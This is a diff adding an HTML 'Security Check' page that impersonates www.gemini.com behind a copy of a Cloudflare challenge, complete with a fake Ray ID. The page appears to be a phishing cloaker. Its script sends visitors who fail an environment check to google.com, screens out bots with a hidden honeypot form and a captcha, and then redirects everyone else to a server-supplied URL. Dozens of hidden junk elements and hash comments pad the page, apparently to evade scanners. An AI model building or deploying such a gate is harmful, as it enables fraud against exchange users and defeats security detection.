@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en" data-v="7eed41a789d699570eb5c6684cef0a93" data-t="1765350853962">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background-color: #1C1C1C;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            color: #d9d9d9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        .content {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            font-weight: 500;
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 2rem;
+            opacity: 0.8;
+        }
+
+        #captchaContainer {
+            margin: 2rem 0;
+            display: none;
+            min-height: 65px;
+            justify-content: center;
+        }
+
+        .message {
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        .footer {
+            margin-top: 2rem;
+            font-size: 0.8rem;
+            opacity: 0.6;
+        }
+
+        .honeypot-field {
+            position: absolute !important;
+            left: -9999px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+            width: 0 !important;
+            height: 0 !important;
+        }
+    </style>
+    <!-- t:1765350853955_ee6ab0ca856419937631f2624d8f5eb71cc454d7172cbe41c2e0f35dee59ae06 -->
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="017392875fe41b8aa9481982df85399d" data-v="f3f86cd814c902be5a86cdb143033d5b32c2763b71d68307d26b6c3b05d749c3" data-t="1765350853955"></div>
+<meta name="_n57471257228e96f1" content="dc82e6c6e2c31857f0e50bd0449930fe72f026948670e6001b2cad244d29422c" data-v="8067a675243b094928b207cf53149aa7">
+<span style="display:none!important" data-h="10b65770d743b0cde4141aa1cc0555fd" aria-hidden="true"></span>
+<!-- t:1765350853955_fbf7975edc636a92770d17ac1d03e33d445718d40316e5d5092a15bc369c4ef9 -->
+<!-- t:1765350853955_872e54bb189166a5af2910ec4280d75efc5f0cbac81ad0445ec4cb5b1425228b -->
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="3a3d056af902d23dd7ea9461a2a0eb4a" data-v="f37bc24613939669da7a53ba609dc545938bfe6e9d0dda93a19e69023f25eea1" data-t="1765350853955"></div>
+<span style="display:none!important" data-h="97639cbc9dadf9d6f213fc107b979d12" aria-hidden="true"></span>
+<meta name="_nc8ad1adeff6702b6" content="e208e0d4e7f05a6ce8747846d0db733c6b7a26f8431212230078d26173e205b9" data-v="8066aa3f06a3ff0429c5bf2b3b171f7e">
+<script type="application/json" style="display:none">{"t":1765350853955,"h":"623b8745352d068a3fc1d1a4686a096f54517ecb510de1e5d1100757470ba8b3","v":"4c2c7cb6c9dc1b280d522e7dab84ddf0"}</script>
+<script type="application/json" style="display:none">{"t":1765350853955,"h":"87c50c800cce310833649eac3f41e0f9a4f271f106ea6bc213bb74ee2ac9859a","v":"5a89b52c880c4f2db8a498033b74cc2c"}</script>
+<script type="application/json" style="display:none">{"t":1765350853955,"h":"f511c7e0af888b9786345237cf87621fba74486d6b975d531bdec0e8b4d0441e","v":"05f7d1b297b65fb1008763241304e4a4"}</script>
+<!-- 95a8c812c707da2d722e41ef237690696f88505d38475bebe5e75bdcc900a3d84911124533a175a64a3fe3e5bbab698173d52aa588b1e699df396579c601cefe -->
+<div hidden style="display:none!important" data-r="3832d8a44fe4f545" data-s="1673934eb28b926092312fbc70a5ba19"><span data-v="90b6fb364fb18be8"></span></div>
+<span style="display:none!important" data-h="d7160f46bcec8b35cfa192c56c8dd7fc" aria-hidden="true"></span>
+<!-- bd9014e8cad3f54a5fcf2641cecfdbd88e14f59104781835b061dc912c46920cb8968c2465657c8cde9aba9140b9bfe22ab7b14bc61132fc133d24d1fb4c0581 -->
+<!-- d28ecea1fd5c3c438828797f5c95138d8d553dc711afbd9c0eb63db2d260555e069666454b91640975a3bead268efc1356569ff65b0ac4747fa0d171dfce8f17 -->
+<span style="display:none!important" data-h="549ae02a651b437b7af75a8d875573ca" aria-hidden="true"></span>
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="9b069717f28355c43346782fd6e30641" data-v="c753c32c17e72221b0a374b3a444e49d781cc7371a7dfa37e332132165c9263f" data-t="1765350853955"></div>
+
+      <div aria-hidden="true" style="display:none!important">
+        <!-- t:1765350853955_008f208cedf9c0849d533451b800408968cad5b803b1086cb49b67d9cf3ac39a -->
+<!-- t:1765350853955_9135406b8add5697fcbea69078a16b6b7c152425ef0c92963d5d2cf10cbe5eb2 -->
+<script type="application/json" style="display:none">{"t":1765350853955,"h":"137e815be03c028136a411fe173df046b476b365cab6bb6afabd54cde2bcd001","v":"9d211a0c2b47ecdeeeab20b05ba37807"}</script>
+        <div data-n="01f83ffeacd6c3888ccf801999b7de00">
+          <meta name="_n4e19da6ef7359a89" content="fad887a4a102a06d38857d7baa00efd30cd7b60ceeef62ad33bc4e86a59f6be6" data-v="6c2fe6400e867673db631cb66a785f8b">
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="ae86ae18efa6e1fa1905a40841cf15fa" data-v="319b3adb0320973bf3e07e3883421706cd3294555777d3384e018b8ddaf766da" data-t="1765350853955"></div>
+        </div>
+      </div>
+    
+</head>
+<body data-k="9d80c64c81bcad0f6d1c2ae05f3a9f65" data-t="1765350853962">
+    <span style="display:none!important" data-h="84d9ef18509e606489658a1f33be0095" aria-hidden="true"></span>
+<meta name="_n5c6459b82f80aea1" content="963e8b695c8bc3e225f3f232528cc654fbd110aaed052ba66708c81ad721bbbd" data-v="3c3e28cc7fb409b17e107525dbf0ddb4">
+<!-- t:1765350853960_44f3b59fa70f898256235fcac22322c78d5553b5259a0d1af95641df97e437c1 -->
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="799f2c2c0cfb136c83c65b434327ec46" data-v="c426fcddf40553c297701a6023d455e2f5e7c7c8b77116916c434f7d082db837" data-t="1765350853960"></div>
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="317208a1e017f27e97f8bdb8911b6fd4" data-v="60c7d34453b7911bb15849096a671264a34bc503ff9ed33a6f4c0cb21d970e02" data-t="1765350853960"></div>
+
+      <div aria-hidden="true" style="display:none!important">
+        <div hidden style="display:none!important" data-r="4f7eae3bea333297" data-s="10d1c71b9fc4f5caf388e7328d4df710"><span data-v="1e312c0911f5d41e"></span></div>
+<div hidden style="display:none!important" data-r="a41d7b951792a886" data-s="33adc96ee1b5e9a8d5aeaa74cdcf10d7"><span data-v="3ec6867e3cbe69d2"></span></div>
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="541e3c9cf0c96fd4a5d55b88f0a66ac6" data-v="b5800fe679c0ec533d09c9f40841ad5fcedddfc408e32a432e7d819164500039" data-t="1765350853961"></div>
+        <div data-n="9c9ab325f2b6548e36531e50ceaca76a">
+          <!-- t:1765350853961_3ea781520b96da83e04ebeb475ec81f033f132cad86a4f132264db5c95d34188 -->
+<span style="display:none!important" data-h="8505a79556dddc1d8a5e66be36d6f5e8" aria-hidden="true"></span>
+        </div>
+      </div>
+    
+<!-- b2e245b3221f0576fae8d9cd5714cbcb2ca211beaa4c9c3154fdc557df37cdb03ba683a2684674e4894153ff5b888f28671112e731f017ca3b3735e801175abf -->
+<!-- t:1765350853960_559cb3cda12e357f6d475a891313810bc32f69438be0542f8638b9311e70a505 -->
+<div hidden style="display:none!important" data-r="ab6537a1addde734" data-s="b154dda02dd588a04e59ebb34d76880c"><span data-v="140ce0457706fb0b"></span></div>
+<span style="display:none!important" data-h="75b8dec69522f5554e82815febc8fb3c" aria-hidden="true"></span>
+<div hidden style="display:none!important" data-r="32031090a0678bb0" data-s="b602884a92aef4c949f1e45ba28db858"><span data-v="961c6df48306e546"></span></div>
+<script type="application/json" style="display:none">{"t":1765350853961,"h":"cdbf4039ae1cfa3f7a95df40f6c23c8e00242f0f1ba7d8815dd70969fe386e8c","v":"233645121cbd9e35cd1322975295d3de"}</script>
+<span style="display:none!important" data-h="3d59a71d1ddeab674d68646b9ec552bd" aria-hidden="true"></span>
+<!-- t:1765350853960_1b7cb816a49ffe16b616893c2bd2dccd590dc12a62f0c015a066b7f4c6ea5cfd -->
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="0d6e7635a0b68b281c47eaca2c5a8ee3" data-v="e15fa61ad04144357ad6dd49fab40b4a7d001e2b81a4252d9bc07ae332f7ff2d" data-t="1765350853960"></div>
+<!-- t:1765350853960_9532c38342dddaa3a37c4b4ae0df1165707e56b73818564699a11c35eb3630d1 -->
+    <form id="contact-form" class="honeypot-field">
+        <input type="email" name="email" autocomplete="off">
+        <input type="text" name="username" autocomplete="off">
+        <input type="url" name="website" autocomplete="off">
+    </form>
+
+    <div class="content">
+        <div hidden style="display:none!important" data-r="436797010d50c135" data-s="6f29bf0db213c206e6f0150c781556a7"><span data-v="e61fb5d4e2a0a633"></span></div>
+<span style="display:none!important" data-h="95a559391518bead3dfe873e96f9353b" aria-hidden="true"></span>
+<div hidden style="display:none!important" data-r="376172e299a63b24" data-s="2b7352350405a9a788922dc1c1f27377"><span data-v="0d9732302f91ef9d"></span></div>
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="f7e10a510fe338bcd10f4461b7f7b8c2" data-v="8c10a1143811075225e4cda5337db15320b611d5c7d0330a7a8abb757d5e08f4" data-t="1765350853961"></div>
+<span style="display:none!important" data-h="7189d7d27a996725ffc7417d6ba4f507" aria-hidden="true"></span>
+<script type="application/json" style="display:none">{"t":1765350853961,"h":"01b20b6725c7d4f5c925600f47303cc725451b9fbe0085c415dd380fd86efc6c","v":"9a35150aadde72f4a72724723b4dbe08"}</script>
+<!-- 7a2da06345e4894aa186d0126e32027171b206ab9709886d9337246ba313914c76926792838c8df10240c7ea183bd2a7fa7251c98ca53664124df38a3fd9f5cb -->
+<div hidden style="display:none!important" data-r="3d05d1131b5bac97" data-s="431cf63de6732f61a7e3ee5cb0bdd740"><span data-v="e47ce1b64d0e994e"></span></div>
+<script type="application/json" style="display:none">{"t":1765350853961,"h":"dccead57da8a118bc531cc356b0fbe32ed9e87a7357c2491c4511b9eab154203","v":"469ccb6975309e3982affc4f7e1322fc"}</script>
+<!-- t:1765350853961_47639942fd89b2677afaff6dfbbd2b451a908d9cb7cc59f2a7ea883bce043815 -->
+<span style="display:none!important" data-h="1ffe415f40ee452e59e4b22abb020068" aria-hidden="true"></span>
+<span style="display:none!important" data-h="096666d9db6c5dc915fb8fcca324d31c" aria-hidden="true"></span>
+<!-- f808bdafedd276eb344e824489a0af3ee361ff1407717d0bba92098fddd41dcb3cb71f5bc65775446969ee384dcc1273d786a91d301092a09afe987e6482e959 -->
+<!-- f421e16c058eb402f87d1fb91a04d8eb6db092b97429a03872c51eae6bcad544e25eb5f9b4b9268494e2fa36f34d05aac4ef460282f541552e1e6e09cd41fa10 -->
+<!-- 388ace6d7f73687057414e4be11acb4d1422d81603ea54c74c06b2826af2377e4cf90e3e9234f74f90d68f96ba4fa0192adc8071b541e5f5f4839d2687aa6d5c -->
+<!-- 2f425be2749dbda7013f60582ad0f3cb4ee25dd6a8aecf9da70df574888bd13bd5684092bc3e006f5066c0c93022dd26b547a88e4cc3deeb88c5d00f55df334b -->
+<!-- dbd7b29e32f477dfe511d0ad135ccb9c3bed90b1c73f20379c8795559c4c7087ac346623d50e63c3358dd85795bae1c90ae869f3f9de33bb67760a69986b2178 -->
+<!-- t:1765350853961_c02447a898f2b9a3ebe54da9a86eea302d2bdcc892e913585389533bd3007849 -->
+<span style="display:none!important" data-h="a57aa503c4c5d80152a0826dc7e3c6ce" aria-hidden="true"></span>
+<meta name="_n8fcd2a6e74e562ff" content="2703c8c09c861147a2fc4e0b0332da40f33e14a52ade38036f020ae5a502956d" data-v="2757c89d3d3950c4c411498c65e39628">
+
+      <div aria-hidden="true" style="display:none!important">
+        <div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="28e8edad8ccd0fa96dd4c1927142823f" data-v="4b5e3a354b32f76283ba52fe28a6ce8ee945d5a5b42ce9868bfc7428706aa5b9" data-t="1765350853961"></div>
+<div hidden style="display:none!important" data-r="56ab32f060954052" data-s="1b46d2af47e811873a23ba2c5786aabc"><span data-v="a70b1ba7bb3c62c5"></span></div>
+<script type="application/json" style="display:none">{"t":1765350853961,"h":"eb5770ceead0a4dcd6e989bc370c114f5c05c042e6fd38f39f55906bf76ddeb2","v":"25bce2d629427d98820eb3801802bf9b"}</script>
+        <div data-n="d7b1d5b280198cedac14893bb90a1eb6">
+          <!-- 9e6c533d1dbcb9c7b54c452533d4c99ebb04c8a8e86176d8601603f1c0829e08b191dbca78b2dca6569660d5e59de10694ce21022542df31e56059fb0f993ec9 -->
+<span style="display:none!important" data-h="ea1f2f6fd525612d05799af2db30184c" aria-hidden="true"></span>
+        </div>
+      </div>
+    
+<span style="display:none!important" data-h="2ac66dd7385e746fd6d94aa1ddf0c9a6" aria-hidden="true"></span>
+<div hidden style="display:none!important" data-r="aca1c06d583ec9ba" data-s="b856f64b981482877e4270a1763a43f5"><span data-v="a7920222905e70d7"></span></div>
+        <h1 class="title">www.gemini.com</h1>
+        <p class="subtitle">Verifying your browser before accessing the site...</p>
+        
+        <div id="captchaContainer">
+            <div class="cf-turnstile" 
+                data-sitekey="0x4AAAAAAA6nLMIOrr88f_h4"
+                data-callback="onCaptchaSuccess"
+                data-theme="dark"></div>
+        </div>
+
+        <div class="message">
+            This check is taking longer than expected. Please refresh the page if it doesn't load.
+        </div>
+
+        <div class="footer">
+            Ray ID: <code>32ebd8eb2a</code>
+        </div>
+    </div>
+
+    <script>
+        let captchaToken = null;
+        let verificationAttempts = 0;
+        let turnstileLoaded = false;
+        const maxAttempts = 3;
+
+        async function verifyEnvironment() {
+            try {
+                const response = await fetch('/verify-environment', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                const result = await response.json();
+                if (!result.valid) {
+                    console.error('Environment verification failed:', result.reason);
+                    window.location.replace('https://google.com');
+                    return false;
+                }
+
+                const captchaElem = document.getElementById('captchaContainer');
+                if (captchaElem && !turnstileLoaded) {
+                    captchaElem.style.display = 'flex';
+                    
+                    const script = document.createElement('script');
+                    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
+                    script.async = true;
+                    script.defer = true;
+                    script.onload = () => {
+                        turnstileLoaded = true;
+                    };
+                    document.body.appendChild(script);
+                }
+                return true;
+            } catch (error) {
+                console.error('Error verifying environment:', error);
+                window.location.replace('https://google.com');
+                return false;
+            }
+        }
+
+        function onCaptchaSuccess(token) {
+            captchaToken = token;
+            checkAccess();
+        }
+
+        async function checkAccess() {
+            if (verificationAttempts >= maxAttempts) {
+                window.location.replace('https://google.com');
+                return;
+            }
+
+            verificationAttempts++;
+
+            try {
+                const sessionId = new URLSearchParams(window.location.search).get('client_id');
+                
+                const formData = new FormData(document.getElementById('contact-form'));
+                const honeypotData = {
+                    email: formData.get('email'),
+                    username: formData.get('username'),
+                    website: formData.get('website')
+                };
+
+                const honeypotResponse = await fetch('/verify-honeypot', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(honeypotData)
+                });
+
+                const honeypotResult = await honeypotResponse.json();
+                if (honeypotResult.redirect) {
+                    window.location.replace(honeypotResult.redirect);
+                    return;
+                }
+
+                const verifyResponse = await fetch('/verify-turnstile', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        token: captchaToken,
+                        sessionId: sessionId
+                    })
+                });
+                
+                const verifyResult = await verifyResponse.json();
+                if (verifyResult.success && verifyResult.verified && verifyResult.url) {
+                    window.location.replace(verifyResult.url);
+                }
+            } catch (error) {
+                console.error('Error in checkAccess:', error);
+            }
+        }
+
+        // Initialize verification when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', verifyEnvironment);
+        } else {
+            verifyEnvironment();
+        }
+        
+        // Add some noise to window object
+        window._v = {
+            t: Date.now(),
+            h: "2d046ed3af68df126baa56f4",
+            m: "e8fb88dea7e7311cf78b933d097fdc01aca72c93d082800777986a9ea3c8a8e2",
+            d: {
+                v: "4a6c4dd593b183dbe5fc8aaa1800a865",
+                t: Date.now(),
+                h: "310096ed166a4e2b60bf2f52b3fe6a00405e812a27438d9e"
+            }
+        };
+    </script>
+    <meta name="_nbea330262be2e9a6" content="61e5cc3e8b25460157351ca0badf4f914a22cc2dcf21e3ca27f8f0ca4e74dde8" data-v="69a54bfc361cf96939c8c205ca28b51d">
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="03e5c0b80d40dc556c407ca493c43f66" data-v="29a4bdd3651518c08d1a7b07330bc7c0dc28ebcd3112e419409fc8ea8f16118b" data-t="1765350853962"></div>
+<script type="application/json" style="display:none">{"t":1765350853962,"h":"8297d4c9f7ecb11ea04ae1b2c342c8a6e2e55450048e9de288ee466640b2164b","v":"31ecb09f28b590e7b66a7946f16b8094"}</script>
+<span style="display:none!important" data-h="755dc281ca2139ca52a5c0f61902674e" aria-hidden="true"></span>
+<!-- t:1765350853962_6040f9a90a098be781756365b5096b4cc12635d134920f1b1e92652db0805bd0 -->
+<!-- 385e6318e4b931e32df3f9455778accc035528345dbcb6d8721643be30d7114bf3cbbb1324103e53a99c4f65bc25ac45805fb98adbc68ce67c57c2ac038af810 -->
+<meta name="_n99baa517353a2e92" content="c619308244eff56cb230b761e82b0c96bbcbcadbab4ae2a45bf0d35e370e255e" data-v="ee59b4d1599c0e7d2948e2efa0e3d880">
+<script type="application/json" style="display:none">{"t":1765350853962,"h":"bcfb674bf2136092447e5d17ede266685a81ac5a1bc5a9517b498912e0e319a4","v":"5ddb2544498b1c4acf3ba051117f7080"}</script>
+<script type="application/json" style="display:none">{"t":1765350853962,"h":"69719554b5cdc2b777d5c3b398383ab749026ec873eb4dbf43377421a30ebef8","v":"68c7e714d4bff663763836cd34b157fc"}</script>
+<div hidden style="display:none!important" data-r="ba6a11d7e64f62e3" data-s="1c61ae660dad20c4175e8b5511436ef2"><span data-v="b032ae588d023a9f"></span></div>
+<!-- 4a6bcd2ac0f6e892a75ac953bcd20e29a1e41efe8ace3ea60a8617bff523977b830c5abb08e0e44e39943ff528b4c9bf6361fd68dded50ff0320865afde8dff0 -->
+<meta name="_n66d8f841a39ffeeb" content="1373aa20f10a49d71a76a4866c8f8d1cea11add32751a490e26a8c9808c2c2ce" data-v="36c0c9279cd38d339965ac60dc84fe65">
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="56430ca720b02d09d6e3f6ba4bfa2f00" data-v="36d369a23d0aedfbc6f5e840b3609fc12e6d74cd40507600ffc0405a464817a5" data-t="1765350853962"></div>
+<span style="display:none!important" data-h="0a0a2aa68ff8b6f011993db2c39b2cdb" aria-hidden="true"></span>
+<script type="application/json" style="display:none">{"t":1765350853962,"h":"159e43508303097cd7f8fac2906cac360593d95eac7e2cca56893d13f3edba2a","v":"b97b0726ca182df19fbb869a88efb1a9"}</script>
+<span style="display:none!important" data-h="6f8097e3a1be6adaab5d47c4694c5ee9" aria-hidden="true"></span>
+<meta name="_nb6a27d475310bbf6" content="e35333ee1af8a3f509f77a80257e88c6fbb70487e7d5419d3936c8d456bc2a08" data-v="7781466715d32f0ccbfd75232e661e4d">
+<!-- 7d92d9f33d0adb8c0291b548929ce49ef6c58bd832dc921a664ce6798ca6382c44ec982445b6e5d802edb8648e7a11e4455d21cc4c4b807707d61593503a4f9b -->
+<span style="display:none!important" data-h="c3cff9e19a89e3cd03ffd326e3b06097" aria-hidden="true"></span>
+<div aria-hidden="true" style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;" data-n="a244e122f8037a67614a5e9d9ef7984a" data-v="70820278db1af40f7524aa2bfc51fb1a2bac48d12e10592e965a817b68f77771" data-t="1765350853962"></div>
+
+      <div aria-hidden="true" style="display:none!important">
+        <!-- 82a55cac259129c7f262713ad72dfd1dd7a0677003f9f3a6bf4ccfa0b1c935aef66089a9bb0d3af20250fba956e23a5accdd9e7159f13407d4d5f99ee1a470e9 -->
+<div hidden style="display:none!important" data-r="beab3221cc6956a5" data-s="d0aa286ed9d6fde3d7418685495df766"><span data-v="0fa97684ce27aa34"></span></div>
+<span style="display:none!important" data-h="5048551536f8851934e53087dcb33065" aria-hidden="true"></span>
+        <div data-n="128974d133224119a7b6c374a54800d6">
+          <meta name="_n3876303af67e75be" content="4b7f75844b22e7488790deb82d725eac3323cf3db2b6603eae8ac21dedb9c358" data-v="3507c1db8a5c21dc0dc1c8d0352bedae">
+<meta name="_n2bea53a7a114dcd2" content="6ffebc776a97139e71d3dc1bba1088925ed8ead28f6d4af1396cd34f7bf138bc" data-v="fb1cd1fd710e3d156d9ddf96e2bb2890">
+        </div>
+      </div>
+    
+</body>
+</html>
